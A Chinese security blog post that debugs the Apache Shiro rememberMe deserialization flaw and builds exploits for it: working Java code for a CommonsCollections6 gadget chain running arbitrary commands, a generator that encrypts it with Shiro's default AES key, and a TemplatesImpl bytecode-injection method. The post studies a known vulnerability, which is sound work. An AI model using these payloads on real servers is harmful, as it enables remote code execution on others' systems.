<!DOCTYPE html>
<html lang="zh-CN">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="Liyc" />
  <meta name="description" content="" />
  
  
  <title>
    
      初始shiro反序列化漏洞 
      
      
    
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.svg">
    <link rel="icon" href="/images/favicon.svg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/css/common.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">


  

  
    
<link rel="stylesheet" href="/css/post.css">

  

  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="xianbei's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <a href="/">xianbei</a>
</div>


      <p class="links">
  
    <a title="archives" target="" href="/archives/">
      <i class="iconfont icon-bookmark"></i>
    </a>
  
    <a title="github" target="_blank" href="https://github.com/xianbeil">
      <i class="iconfont icon-github"></i>
    </a>
  
    <a title="twitter" target="" href="https://twitter.com/aeqaq0">
      <i class="iconfont icon-twitter"></i>
    </a>
  
</p>


      <div class="main">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']]
    }
  };
</script>

<div class="post">
  <h3 class="date">
    Apr 06, 2022
  </h3>
  <h1>
    初始shiro反序列化漏洞
  </h1>
  <div class="content markdown-body">
    <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本篇分为上下两部分</p>
<ul>
<li>介绍shiro,调试分析shiro出现反序列化漏洞的根本原因</li>
<li>通过自己修改CC链来攻击shiro应用</li>
</ul>
<blockquote>
<p>关于shiro的基本学习，概念，就不发博客了</p>
</blockquote>
<h1 id="简单的shiro应用搭建"><a href="#简单的shiro应用搭建" class="headerlink" title="简单的shiro应用搭建"></a>简单的shiro应用搭建</h1><p>p牛写的一个最简单的shiro登录应用，没有适用任何框架，十分简单。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
<p>我们配置一下自己的maven，配置一下tomcat发布就行。</p>
<p>用root&#x2F;secret登录，返回一个remeberMe就说明搭建ok了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405200324-qnipuyf.png" alt="image.png"></p>
<h1 id="shiro反序列化漏洞原理剖析"><a href="#shiro反序列化漏洞原理剖析" class="headerlink" title="shiro反序列化漏洞原理剖析"></a>shiro反序列化漏洞原理剖析</h1><p>从简介中我们得知，是Cookie中的remberMe字段出的问题，shiro会将它解密之后反序列化。</p>
<p>所以要针对remberMe来进行分析</p>
<h2 id="生成remberMe"><a href="#生成remberMe" class="headerlink" title="生成remberMe"></a>生成remberMe</h2><p>shiro生成remberMe的地方在<code>org.apache.shiro.mgt.DefaultSecutiryManager</code>的login方法，可以打上断点调试。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405225302-71rolmh.png" alt="image.png"></p>
<p>截获断点，当登陆成功的时候，会进入下面的<code>createSubject</code>，创建一个新的Subject</p>
<blockquote>
<p>Subject: 为<code>认证主体</code>。应用代码直接交互的对象是Subject,Subject代表了当前的用户。包含<code>Principals</code>和<code>Credentials</code>两个信息。</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230135-k2h55d5.png" alt="image.png"></p>
<p>步入下面的onSuccessfulLogin()方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230700-ilvuwi4.png" alt="image.png"></p>
<p>这里的token为我们浏览器传入的数据，其中remberMe为true，代表开启remberMe</p>
<p>subject是传进来的loggin</p>
<p>步入rmm.onSuccessfulLogin方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230944-hofzlf3.png" alt="image.png"></p>
<p>继续跟进，最终发现序列化accountPrincipals对象的地方在这里：</p>
<p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code> 的convertPrincipalsToBytes方法中</p>
<p>下面也能看到完整方法栈，如果想调试可以参考。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405231222-d49u3to.png" alt="image.png"></p>
<p>然后在这里base64编码然后设置为cookie</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405231629-6wc4wmc.png" alt="image.png"></p>
<h2 id="解析remberMe"><a href="#解析remberMe" class="headerlink" title="解析remberMe"></a>解析remberMe</h2><p>用刚刚生成的正常的remberMe来调试反序列化，直接锁定<code>AbstractRememberMeManager</code>这个类在解密的地方打上断点，（不知道前面的过程但是肯定要解密反序列化吧）</p>
<p>发包的时候要删除原来的JSSESSID，建立一个新会话</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405233813-vkelq2w.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405233904-io898k8.png" alt="image.png"></p>
<p>哦吼，截获了断点，获得了方法栈，往上面追溯到<code>DefaultSecutiryManager</code>进行调试</p>
<p>跟进getRemberedIdentity方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405234603-s7io7wr.png" alt="image.png"></p>
<p>此时我们的remberMe在这个里面，可以自行展开看，截图不够了<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405234858-u1tfgzy.png" alt="image.png"></p>
<p>跟进getRememberedIdentity方法：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235039-pxih2yy.png" alt="image.png"></p>
<p>这里应该是要反序列化获得Principals对象了</p>
<p>跟进方法，发现这里先通过一个方法来获得字节数组，然后再反序列化</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235134-8e2icfj.png" alt="image.png"></p>
<p>先看getRemberedSerializedIdentity方法</p>
<p>这个方法中base64解码了我们传入的remberMe字段，转化为字节数组然后返回</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235336-ym3alnt.png" alt="image.png"></p>
<p>convertBytesToPrincipals方法先进行解密，然后反序列化</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235525-7gdo2js.png" alt="image.png"><br /></p>
<p>（中间跳过了几个步骤）在这里readObject</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406000506-u1b6prl.png" alt="image.png"></p>
<h2 id="aes-key"><a href="#aes-key" class="headerlink" title="aes key"></a>aes key</h2><p>其实这个过程中可以发现一个很关键的问题，就是aes的密钥，如果密钥错了是不能够反序列化的</p>
<p>所以只有知道密钥才能够触发remberMe带来的反序列化漏洞，而在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key。所以高于这个版本的地方这个点就不能使用了。</p>
<h1 id="ACC6打shiro"><a href="#ACC6打shiro" class="headerlink" title="ACC6打shiro"></a>ACC6打shiro</h1><p>在刚刚的项目中也有一个shiroAttack项目，可以当作参考使用，但是这里我们还是自己建一个项目来生成payload</p>
<p>因为项目中有commons collections依赖，所以直接生成一个cc6来打</p>
<h2 id="Transformer数组型"><a href="#Transformer数组型" class="headerlink" title="Transformer数组型"></a>Transformer数组型</h2><p>CommonsCollections6.java</p>
<blockquote>
<p>其实参考p牛的写法，之后自己写的时候也可以效仿他getPayload的写法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>对payload进行加密然后base64输出，这里的aes加密器使用shiro自带的<code>org.apache.shiro.crypto.AesCipherService</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generate1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>().getPayload(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">encoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="comment">//使用shiro默认的key对payload进行加密</span></span><br><span class="line">        <span class="type">byte</span>[] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">text</span> <span class="operator">=</span> encoder.encrypt(payload, key);</span><br><span class="line">        System.out.println(text.toString());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后设置为remberMe字段打进去</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406004852-gh6iook.png" alt="image.png"></p>
<p>随后tomcat报错，没有弹出计算器</p>
<blockquote>
<p>怎么根据报错调试：<a target="_blank" rel="noopener" href="https://bbs.csdn.net/topics/390369450">https://bbs.csdn.net/topics/390369450</a></p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002311-ineikiu.png" alt="image.png"></p>
<p>最后面可以看到报错信息<code>Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context,</code></p>
<p>然后下面其实可以快速到达报错的类，也就是这里抛出的异常，打断点调试</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002428-3tlpqyr.png" alt="image.png"></p>
<blockquote>
<p>其实这里已经进入了刚刚分析的反序列化过程，看方法栈就能知道</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002835-lql098z.png" alt="image.png"></p>
</blockquote>
<p>这个类继承了ObjectInputStream，并且重写了resolveClass方法</p>
<p>resolveClass方法是反序列化的时候通过字符串类名来查找类的方法，可以看到forName也是我们熟悉的，它将根据类名来返回这个类的class类类型。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003002-uli0789.png" alt="image.png"></p>
<blockquote>
<p>这里和没重写之前的方法的差别在于：</p>
<p>一个使用原生类Class，这个我们都熟悉</p>
<p>另一个用的是ClassUtils，这个类位于org.apache.shiro.util包下</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003325-9et2oi5.png" alt="image.png"></p>
<p>我们看一下org.apache.shiro.util.ClassUtils的forName方法：</p>
<p>调试多次之后发现前面的HashMap，TiedEntryMap，ChainTransformer都能返回clazz，但是到这个Transformer类就找不到了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003756-dpwbj29.png" alt="image.png"></p>
</blockquote>
<p>导致报错的地方就在这里：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406004253-n0kqmme.png" alt="image.png"></p>
<p>你可以清晰的看到类名前面是<code>[L</code>，<code>[L</code>是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</p>
<p>reference：<a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
<blockquote>
<p>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
</blockquote>
<h2 id="TemplatesImpl字节码型"><a href="#TemplatesImpl字节码型" class="headerlink" title="TemplatesImpl字节码型"></a>TemplatesImpl字节码型</h2><p>因为它强行用的是shiro包自带的ClassUtil,所以要避免出现数组,可以参考思路:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></p>
<p>因此我们可以考虑用TemplatesImpl字节码来打</p>
<blockquote>
<p>这个时候就考验对cc的学习程度了,因为上面我们发现了问题,就要自己通过CC中各种组件重新构造去解决这个问题</p>
<p>而重新构造意味着要自己编写payload</p>
<p>这里虽然p牛写好了,但是还是尽量自己去把整个exp从0到1写出来比较有体会.</p>
</blockquote>
<h3 id="如何加载TemplatesImpl"><a href="#如何加载TemplatesImpl" class="headerlink" title="如何加载TemplatesImpl"></a>如何加载TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;/*bytes*/&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure>

<h3 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015040-mbzwtgq.png" alt="image.png"></p>
<p>以往我们是这样触发TemplatesImpl的:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但这里transform是可以传入一个参数key的,结合InvokeTransformer的transform方法:</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015821-whcvobi.png" alt="image.png"></p>
<p>那我们可以直接传入,不用第一个<code>new ConstantTransformer(obj),</code>存在了,因为我们也知道这个类的作用就是:<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015901-0cmid5c.png" alt="image.png"></p>
<p>所以就是这么个构造思路:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry.getValue()</span><br><span class="line">	LazyMap.get(key)</span><br><span class="line">		InvokeTransformer.transform()</span><br></pre></td></tr></table></figure>


<p>就是直接把那个类作为参数传给InvokeTransformer就行了,不用通过transform方法递归.</p>
<h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>构造令人头大….总之一步一步来</p>
<h4 id="解决TemplatesImpl的部分"><a href="#解决TemplatesImpl的部分" class="headerlink" title="解决TemplatesImpl的部分"></a>解决TemplatesImpl的部分</h4><p>我直接参照ysoserial的createTemplateImpl方法写</p>
<p>可以看到ysoserial的痕迹还是很足的,但是不影响它的可读性和好用性</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span>  <span class="variable">clazz</span> <span class="operator">=</span> pool.getCtClass(Neo.class.getName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">            <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我把原来ysoserial它修改字节码的基类自己重写了一个Neo类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Neo</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">(DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="构造攻击链"><a href="#构造攻击链" class="headerlink" title="构造攻击链"></a>构造攻击链</h4><p>然后写getPayload方法</p>
<p>也可以参照ysoserial写</p>
